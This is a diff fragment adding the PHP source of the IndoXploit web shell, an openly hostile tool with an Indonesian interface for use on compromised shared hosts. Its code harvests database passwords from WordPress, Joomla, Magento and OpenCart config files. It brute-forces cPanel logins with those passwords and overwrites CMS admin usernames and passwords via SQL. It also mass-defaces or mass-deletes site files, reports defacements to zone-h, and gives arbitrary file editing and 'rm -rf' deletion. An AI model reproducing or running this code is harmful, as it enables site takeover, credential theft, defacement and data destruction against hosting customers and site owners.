+			print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_config/' frameborder='0' scrolling='yes'></iframe>";
+			print "</div>";
+		}
+		elseif($_GET['do'] === "zoneh") {
+			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
+				$nick 	= $_POST['nick'];
+				$domain = explode("\r\n", $_POST['url']);
+
+				print "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
+				print "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
+	
+				foreach($domain as $no => $url) {
+					$no   = ($no+1).".";
+					$post = curl("http://www.zone-h.org/notify/single", TRUE, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send")['response'];
+					if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $post)) {
+						print "$no $url -> ".color(1, 2, "OK")."<br>";
+					} else {
+						print "$no $url -> ".color(1, 1, "ERROR")."<br>";
+					}
+				}
+			}
+			else {
+				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
+		    	       Defacer: <br>
+		    	       <input type='text' name='nick' size='50' value='IndoXploit'><br><br>
+		    	       Domains: <br>
+		    	       <textarea style='width: 450px; height: 150px;' name='url' placeholder='http://google.com/'></textarea><br>
+		    	       <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='submit' value='Submit'>
+		    	       </form></center>";
+		   	}
+		}
+		elseif($_GET['do'] == 'cpanel') {
+			if($_POST['crack']) {
+				$usercp = explode("\r\n", $_POST['user_cp']);
+				$passcp = explode("\r\n", $_POST['pass_cp']);
+				$i = 0;
+				foreach($usercp as $ucp) {
+					foreach($passcp as $pcp) {
+						$connect = mysql_connect('localhost', $ucp, $pcp);
+						if($connect) {
+							if($_SESSION[$ucp] && $_SESSION[$pcp]) {
+							} else {
+								$_SESSION[$ucp] = "1";
+								$_SESSION[$pcp] = "1";
+								if($ucp === '' || $pcp === '') {
+									// 
+								} else {
+									$i++;
+									print "username (".color(1, 2, $ucp).") password (".color(1, 2, $pcp).") domain (";
+									if(!function_exists('posix_getpwuid')) print color(1, 1, "Function is Disable by System!");
+									if(!getdomainname()) print color(1, 1, "Can't get domain name");
+									foreach(getdomainname() as $domain) {
+										$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
+										$userdomain = $userdomain->name;
+										if($userdomain === $user) {
+											print "<a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
+											break;
+										}
+									}
+									print (empty($domain)) ? color(1, 1, "Can't get domain name.") : color(1, 2, $domain);
+									print ")<br>";
+								}
+							}
+							mysql_close($connect);
+						}
+					}
+				}
+				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by IndoXploit")."</p>";
+			} else {
+				print "<center>
+					   <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
+					   <form method='post'>
+					   USER: <br>
+					   <textarea style='width: 450px; height: 150px;' name='user_cp'>";
+				print implode("\n", getuser());
+				print "</textarea><br>
+					   PASS: <br>
+					   <input style='background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='text' name='linkpass' placeholder='Grab Password from Link Config'>
+					   <input style='background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='submit' name='submitlink' value='>>'>
+					   <br>
+					   <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
+
+				if(isset($_POST['submitlink'])) {
+					$getpass = $_POST['linkpass'];
+					$get = curl($_POST['linkpass'])['response'];
+					preg_match_all('/<a href="(.*?).txt">/', $get, $link);
+					foreach($link[1] as $link_config) {
+						$scandir[] = "$link_config.txt";
+					}
+				}
+				else {
+					$getpass = path();
+					$scandir = scandir($getpass);
+				}
+
+				$password = "";
+
+				foreach($scandir as $files) {
+					$file = "$getpass/$files";
+					$config = file_get_contents($file);
+					if(preg_match("/WordPress/", $config)) {
+						$password .= getValue($config, "DB_PASSWORD', '", "'")."\n";
+					} 
+					elseif(preg_match("/JConfig|joomla/", $config)) {
+						$password .= getValue($config, "password = '", "'")."\n";
+					} 
+					elseif(preg_match("/Magento|Mage_Core/", $config)) {
+						$password .= getValue($config, "<password><![CDATA[", "]]></password>")."\n";
+					} 
+					elseif(preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
+						$password .= getValue($config, 'password = "', '"')."\n";
+					} 
+					elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
+						$password .= getValue($config, "'DB_PASSWORD', '", "'")."\n";
+					} 
+					elseif(preg_match("/^[client]$/", $config)) {
+						preg_match("/password=(.*?)/", $config, $pass);
+						if(preg_match('/"/', $pass[1])) {
+							$pass[1] = str_replace('"', "", $pass[1]);
+							$password .= $pass[1]."\n";
+						} 
+						else {
+							$password .= $pass[1]."\n";
+						}
+					} 
+					elseif(preg_match("/cc_encryption_hash/", $config)) {
+						$password .= getValue($config, "db_password = '", "'")."\n";
+					}
+				}
+
+				print $password;
+
+				print "</textarea><br>
+					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='crack' value='Crack'>
+					   </form></center>";
+			}
+		}
+		elseif($_GET['do'] == 'mpc') {
+			if($_POST['hajar']) {
+				if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
+					print "username atau password harus lebih dari 6 karakter";
+				} 
+				else {
+					$user_baru = $_POST['user_baru'];
+					$pass_baru = md5($_POST['pass_baru']);
+					$conf = $_POST['config_dir'];
+
+					if(preg_match("/^http:\/\//", $conf) OR preg_match("/^https:\/\//", $conf)) {
+						$get = curl($conf)['response'];
+						preg_match_all('/<a href="(.*?).txt">/', $get, $link);
+						foreach($link[1] as $link_config) {
+							$scan_conf[] = "$link_config.txt";
+						}
+					}
+					else {
+						$scan_conf = scandir($conf);
+					}
+
+					foreach($scan_conf as $file_conf) {
+						$config = file_get_contents("$conf/$file_conf");
+						if(preg_match("/JConfig|joomla/",$config)) {
+							$dbhost = getValue($config,"host = '","'");
+							$dbuser = getValue($config,"user = '","'");
+							$dbpass = getValue($config,"password = '","'");
+							$dbname = getValue($config,"db = '","'");
+							$dbprefix = getValue($config,"dbprefix = '","'");
+							$prefix = $dbprefix."users";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+							$result = mysql_fetch_array($q);
+							$id = $result['id'];
+							$site = getValue($config,"sitename = '","'");
+							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => Joomla<br>";
+							if($site == '') {
+								print "Sitename => ".color(1, 1, "Can't get domain name")."<br>";
+							} 
+							else {
+								print "Sitename => $site<br>";
+							}
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						} elseif(preg_match("/WordPress/",$config)) {
+							$dbhost = getValue($config,"DB_HOST', '","'");
+							$dbuser = getValue($config,"DB_USER', '","'");
+							$dbpass = getValue($config,"DB_PASSWORD', '","'");
+							$dbname = getValue($config,"DB_NAME', '","'");
+							$dbprefix = getValue($config,"table_prefix  = '","'");
+							$prefix = $dbprefix."users";
+							$option = $dbprefix."options";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+							$result = mysql_fetch_array($q);
+							$id = $result[ID];
+							$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+							$result2 = mysql_fetch_array($q2);
+							$target = $result2[option_value];
+							if($target == '') {
+								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+							} 
+							else {
+								$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
+							}
+							$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => Wordpress<br>";
+							print $url_target;
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						} 
+						elseif(preg_match("/Magento|Mage_Core/",$config)) {
+							$dbhost = getValue($config,"<host><![CDATA[","]]></host>");
+							$dbuser = getValue($config,"<username><![CDATA[","]]></username>");
+							$dbpass = getValue($config,"<password><![CDATA[","]]></password>");
+							$dbname = getValue($config,"<dbname><![CDATA[","]]></dbname>");
+							$dbprefix = getValue($config,"<table_prefix><![CDATA[","]]></table_prefix>");
+							$prefix = $dbprefix."admin_user";
+							$option = $dbprefix."core_config_data";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+							$result = mysql_fetch_array($q);
+							$id = $result[user_id];
+							$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
+							$result2 = mysql_fetch_array($q2);
+							$target = $result2[value];
+							if($target == '') {
+								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+							} 
+							else {
+								$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
+							}
+							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => Magento<br>";
+							print $url_target;
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
+							$dbhost = getValue($config,"'DB_HOSTNAME', '","'");
+							$dbuser = getValue($config,"'DB_USERNAME', '","'");
+							$dbpass = getValue($config,"'DB_PASSWORD', '","'");
+							$dbname = getValue($config,"'DB_DATABASE', '","'");
+							$dbprefix = getValue($config,"'DB_PREFIX', '","'");
+							$prefix = $dbprefix."user";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+							$result = mysql_fetch_array($q);
+							$id = $result[user_id];
+							$target = getValue($config,"HTTP_SERVER', '","'");
+							if($target == '') {
+								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+							} 
+							else {
+								$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
+							}
+							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => OpenCart<br>";
+							print $url_target;
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						} 
+						elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
+							$dbhost = getValue($config,'server = "','"');
+							$dbuser = getValue($config,'username = "','"');
+							$dbpass = getValue($config,'password = "','"');
+							$dbname = getValue($config,'database = "','"');
+							$prefix = "users";
+							$option = "identitas";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
+							$result = mysql_fetch_array($q);
+							$target = $result[alamat_website];
+							if($target == '') {
+								$target2 = $result[url];
+								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+								if($target2 == '') {
+									$url_target2 = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+								} 
+								else {
+									$cek_login3 = file_get_contents("$target2/adminweb/");
+									$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
+									if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
+										$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
+									} 
+									elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
+										$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
+									} 
+									else {
+										$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+									}
+								}
+							} else {
+								$cek_login = file_get_contents("$target/adminweb/");
+								$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
+								if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
+									$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
+								} 
+								elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
+									$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
+								} 
+								else {
+									$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+								}
+							}
+							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => Lokomedia<br>";
+							if(preg_match("/Can't get domain name/", $url_target)) {
+								print $url_target2;
+							} 
+							else {
+								print $url_target;
+							}
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						}
+					}
+				}
+			} 
+			else {
+				print "<center>
+				<h1>Mass Password Change</h1>
+				<form method='post'>
+				<input type='radio' name='config_type' value='dir' checked>DIR Config<input type='radio' name='config_type' value='link'>LINK Config<br>
+				<input type='text' size='50' name='config_dir' value='".path()."'><br><br>
+				Set User & Pass: <br>
+				<input type='text' name='user_baru' value='indoxploit' placeholder='user_baru'><br>
+				<input type='text' name='pass_baru' value='indoxploit' placeholder='pass_baru'><br>
+				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
+				</form></center>";
+			}
+		}
+		elseif($_GET['do'] === "mass") {
+			if($_POST['start']) {
+				if($_POST['mass_type'] === 'singledir') {
+					print "<div style='margin: 5px auto; padding: 5px'>";
+					massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file']);
+					print "</div>";
+				} 
+				elseif($_POST['mass_type'] === 'alldir') {
+					print "<div style='margin: 5px auto; padding: 5px'>";
+					massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file'], "-alldir");
+					print "</div>";
+				}
+				elseif($_POST['mass_type'] === "delete") {
+					print "<div style='margin: 5px auto; padding: 5px'>";
+					massdelete($_POST['d_dir'], $_POST['d_file']);
+					print "</div>";
+				}
+			} 
+			else {
+				print "<center><form method='post'>
+					   <font style='text-decoration: underline;'>Tipe Sabun:</font><br>
+					   <input type='radio' name='mass_type' value='singledir' checked>Mass Deface Single Directory<input type='radio' name='mass_type' value='alldir'>Mass Deface All Directory<input type='radio' name='mass_type' value='delete'>Mass Delete File<br>
+					   <span>( kosongkan 'Index File' jika memilih Mass Delete File )</span><br><br>
+					   <font style='text-decoration: underline;'>Folder:</font><br>
+					   <input type='text' name='d_dir' value='".path()."' style='width: 450px;' height='10'><br><br>
+					   <font style='text-decoration: underline;'>Filename:</font><br>
+					   <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
+					   <font style='text-decoration: underline;'>Index File:</font><br>
+					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by IndoXploit</textarea><br>
+					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
+					   </form></center>";
+			}
+		}
+		elseif($_GET['do'] == 'fakeroot') {
+			ob_start();
+
+			$site = explode("\r\n", $_POST['url']);
+			$user = usergroup()->name;
+			$file = $_POST['file'];
+
+			if(!preg_match("#/home/$user/public_html#", $_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "I think this server not using shared host :("));
+			
+			
+			if($_POST['reverse']) {
+				if(!is_writable($_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "Directory '".$_SERVER['DOCUMENT_ROOT']."' is not writeable."));
+				if(!is_writable(dirname($_SERVER['DOCUMENT_ROOT']))) die(color(1, 1, "Directory '".dirname($_SERVER['DOCUMENT_ROOT'])."' is not writeable."));
+
+				save($_SERVER['DOCUMENT_ROOT']."/".$file, "w", $_POST['script']);
+				save(dirname($_SERVER['DOCUMENT_ROOT'])."/".$file, "w", $_POST['script']);
+
+				foreach($site as $url) {
+					$cek = curl("$url/~$user/$file")['response'];
+					if(preg_match("/hacked/i", $cek)) {
+						print "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
+					}
+				}
+			} else {
+				print "<center><form method='post'>
+				Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
+				User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
+				Domain: <br>
+				<textarea style='width: 450px; height: 250px;' name='url'>";
+				print implode("\n", reverse());
+				print "</textarea><br>
+				<font style='text-decoration: underline;'>Index File:</font><br>
+				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by IndoXploit</textarea><br>
+				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='reverse' value='Scan Fake Root!'>
+				</form><br>
+				NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
+			}
+		} 
+	}
+	elseif(isset($_GET['act'])) {
+		if($_GET['act'] === 'newfile') {
+			if($_POST['save']) {
+				$filename = htmlspecialchars($_POST['filename']);
+				$fopen    = fopen($filename, "a+");
+				if($fopen) {
+					$act = "<script>window.location='?act=edit&dir=".path()."&file=".$_POST['filename']."';</script>";
+				} 
+				else {
+					$act = color(1, 1, "Permission Denied!");
+				}
+			}
+			print $act;
+			print "<form method='post'>
+			Filename: <input type='text' name='filename' value='".path()."/newfile.php' style='width: 450px;' height='10'>
+			<input type='submit' class='input' name='save' value='SUBMIT'>
+			</form>";
+		} 
+		elseif($_GET['act'] === 'newfolder') {
+			if($_POST['save']) {
+				$foldername = path().'/'.htmlspecialchars($_POST['foldername']);
+				if(!@mkdir($foldername)) {
+					$act = color(1, 1, "Permission Denied!");
+				} 
+				else {
+					$act = "<script>window.location='?dir=".path()."';</script>";
+				}
+			}
+			print $act;
+			print "<form method='post'>
+			Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
+			<input type='submit' class='input' name='save' value='SUBMIT'>
+			</form>";
+		} 
+		elseif($_GET['act'] === 'rename_folder') {
+			if($_POST['save']) {
+				$rename_folder = rename(path(), "".dirname(path()).DIRECTORY_SEPARATOR.htmlspecialchars($_POST['foldername']));
+				if($rename_folder) {
+					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
+				} 
+				else {
+					$act = color(1, 1, "Permission Denied!");
+				}
+			print "$act<br>";
+			}
+			print "<form method='post'>
+			<input type='text' value='".basename(path())."' name='foldername' style='width: 450px;' height='10'>
+			<input type='submit' class='input' name='save' value='RENAME'>
+			</form>";
+		} 
+		elseif($_GET['act'] === 'delete_folder') {
+			if(is_dir(path())) {
+				if(is_writable(path())) {
+					@rmdir(path());
+					if(!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf ".path());
+					if(!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q ".path());
+					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
+				} 
+				else {
+					$act = color(1, 1, "Could not remove directory '".basename(path())."'");
+				}
+			}
+			print $act;
+		} 
+		elseif($_GET['act'] === 'view') {
+			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
+		} 
+		elseif($_GET['act'] === 'edit') {
+			if($_POST['save']) {
+				$save = file_put_contents($_GET['file'], $_POST['src']);
+				if($save) {
+					$act = color(1, 2, "File Saved!");
+				} 
+				else {
+					$act = color(1, 1, "Permission Denied!");
+				}
+				print "$act<br>";
+			}
+
+			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "<form method='post'>
+			<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
+			<input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
+			</form>";
+		} 
+		elseif($_GET['act'] === 'rename') {
+			if($_POST['save']) {
+				$rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars($_POST['filename']));
+				if($rename) {
+					$act = "<script>window.location='?dir=".path()."';</script>";
+				} 
+				else {
+					$act = color(1, 1, "Permission Denied!");
+				}
+				print "$act<br>";
+			}
+
+			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "<form method='post'>
+			<input type='text' value='".basename($_GET['file'])."' name='filename' style='width: 450px;' height='10'>
+			<input type='submit' class='input' name='save' value='RENAME'>
+			</form>";
+		}
+		elseif($_GET['act'] === 'delete') {
+			$delete = unlink($_GET['file']);
+			if($delete) {
+				$act = "<script>window.location='?dir=".path()."';</script>";
+			} 
+			else {
+				$act = color(1, 1, "Permission Denied!");
+			}
+			print $act;
+		}
+	}
+	else {
+		files_and_folder();
+	}
+}
+
+serverinfo();
+action();
+?>
 </body>
 </html>
